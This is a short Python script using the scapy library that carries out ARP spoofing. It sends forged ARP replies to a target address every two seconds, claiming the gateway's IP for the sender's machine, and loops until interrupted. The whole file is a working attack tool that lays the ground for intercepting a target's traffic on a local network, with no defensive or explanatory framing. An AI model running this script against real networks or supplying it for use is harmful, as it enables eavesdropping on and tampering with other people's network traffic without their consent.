from scapy.all import ARP, send
import time

# Define the IP addresses
target_ip = "192.168.1.2"  # Target IP in your network
gateway_ip = "192.168.1.1"  # Gateway IP in your network

# Use the corresponding MAC addresses from the ARP table
target_mac = "d0-05-2a-52-f7-5e"  # Target's MAC address
gateway_mac = "f4-27-56-70-c0-d7"  # Gateway's MAC address

def spoof():
    # Send ARP spoofing packet to the target
    spoofed_pkt = ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac)
    send(spoofed_pkt, verbose=0)

try:
    while True:
        spoof()
        time.sleep(2)
except KeyboardInterrupt:
    print("Spoofing stopped.")
